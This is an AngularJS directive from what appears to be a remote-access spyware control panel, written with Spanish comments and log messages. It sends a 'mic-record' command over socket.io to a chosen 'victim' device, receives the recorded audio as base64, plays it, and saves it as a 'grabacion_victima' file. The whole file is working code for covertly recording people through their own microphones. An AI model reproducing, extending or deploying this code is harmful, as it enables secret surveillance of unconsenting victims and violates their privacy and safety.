angular.module('myappy').directive('labMic', function() {
  return {
    restrict: 'E',
    scope: {
      victim: '='
    },
    templateUrl: 'views/mic.html',
    controller: ['$scope', function($scope) {
      $scope.sec = 10;
      $scope.isAudio = true;
      $scope.audioUrl = "";
      $scope.recording = false;

      console.log('labMic controller loaded');

      var socket = window.socket || io();

      $scope.Record = function(sec) {
        console.log("DEBUG Record llamado con sec:", sec);
        $scope.recording = true;
        $scope.isAudio = true;
        $scope.audioUrl = "";
        
        socket.emit('mic-record', {
          victimId: $scope.victim.id,
          seconds: parseInt(sec, 10)
        });
        console.log("DEBUG Orden mic-record enviada");
        if ($scope.addLog) $scope.addLog('Grabando audio durante ' + sec + ' segundos...', 'blue');
      };

      // Escuchar mic-audio (no x0000mc)
      socket.on('mic-audio', function(data) {
        console.log("DEBUG mic-audio recibido:", data);
        
        $scope.$apply(function() {
          $scope.recording = false;
          
          if (data.error || !data.file) {
            console.error("DEBUG error en mic:", data.error);
            $scope.isAudio = true;
            alert("Error al recibir audio: " + (data.error || "Error desconocido"));
            if ($scope.addLog) $scope.addLog('❌ Error: ' + (data.error || 'Error desconocido'), 'red');
            return;
          }

          try {
            console.log("DEBUG Procesando audio");
            
            // El buffer ya viene como base64 string del servidor
            let audioBase64 = data.buffer || '';
            
            if (!audioBase64) {
              throw new Error("No se encontró buffer de audio");
            }

            // Asegúrate de que es base64
            if (!audioBase64.includes(',')) {
              $scope.audioUrl = 'data:audio/mp4;base64,' + audioBase64;
            } else {
              $scope.audioUrl = audioBase64;
            }
            
            console.log("DEBUG audioUrl asignada, primeros 150 chars:", $scope.audioUrl.substring(0, 150));

            // Actualizar el reproductor
            var sourceMp3 = document.getElementById('sourceMp3');
            var player = document.getElementById('player');
            
            if (sourceMp3 && player) {
              sourceMp3.src = $scope.audioUrl;
              sourceMp3.type = 'audio/mp4';
              player.load();
              console.log("DEBUG reproductor actualizado");
            }

            $scope.isAudio = false;
            if ($scope.addLog) $scope.addLog('✅ Audio grabado correctamente (' + (data.name || 'audio.m4a') + ')', 'green');
            console.log("DEBUG audio listo para reproducir");
          } catch (e) {
            console.error("DEBUG error procesando audio:", e);
            $scope.isAudio = true;
            alert("Error procesando el audio: " + e.message);
            if ($scope.addLog) $scope.addLog('❌ Error procesando audio: ' + e.message, 'red');
          }
        });
      });

      $scope.SaveAudio = function() {
        console.log("DEBUG SaveAudio llamado");
        if (!$scope.audioUrl) {
          console.warn("DEBUG audioUrl vacío");
          alert("No hay audio para guardar");
          return;
        }
        try {
          var a = document.createElement('a');
          a.style.display = 'none';
          a.href = $scope.audioUrl;
          a.download = 'grabacion_victima_' + new Date().getTime() + '.m4a';
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
          console.log("DEBUG audio descargado");
          if ($scope.addLog) $scope.addLog('📥 Audio descargado', 'green');
        } catch (e) {
          console.error("DEBUG error descargando audio:", e);
          alert("Error descargando audio: " + e.message);
        }
      };
    }]
  };
});